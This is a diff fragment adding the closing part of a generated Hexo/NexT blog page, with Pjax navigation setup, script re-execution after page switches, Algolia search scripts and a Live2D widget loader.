+  selectors: [
+    'head title',
+    '#page-configurations',
+    '.content-wrap',
+    '.post-toc-wrap',
+    '.languages',
+    '#pjax'
+  ],
+  switches: {
+    '.post-toc-wrap': Pjax.switches.innerHTML
+  },
+  analytics: false,
+  cacheBust: false,
+  scrollTo : !CONFIG.bookmark.enable
+});
+
+window.addEventListener('pjax:success', () => {
+  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
+    var code = element.text || element.textContent || element.innerHTML || '';
+    var parent = element.parentNode;
+    parent.removeChild(element);
+    var script = document.createElement('script');
+    if (element.id) {
+      script.id = element.id;
+    }
+    if (element.className) {
+      script.className = element.className;
+    }
+    if (element.type) {
+      script.type = element.type;
+    }
+    if (element.src) {
+      script.src = element.src;
+      // Force synchronous loading of peripheral JS.
+      script.async = false;
+    }
+    if (element.dataset.pjax !== undefined) {
+      script.dataset.pjax = '';
+    }
+    if (code !== '') {
+      script.appendChild(document.createTextNode(code));
+    }
+    parent.appendChild(script);
+  });
+  NexT.boot.refresh();
+  // Define Motion Sequence & Bootstrap Motion.
+  if (CONFIG.motion.enable) {
+    NexT.motion.integrator
+      .init()
+      .add(NexT.motion.middleWares.subMenu)
+      .add(NexT.motion.middleWares.postList)
+      .bootstrap();
+  }
+  NexT.utils.updateSidebarPosition();
+});
+</script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="//cdn.jsdelivr.net/npm/algoliasearch@4/dist/algoliasearch-lite.umd.js"></script>
+<script src="//cdn.jsdelivr.net/npm/instantsearch.js@4/dist/instantsearch.production.min.js"></script>
+<script src="/js/algolia-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div id="pjax">
+  
+
+  
+
+    </div>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
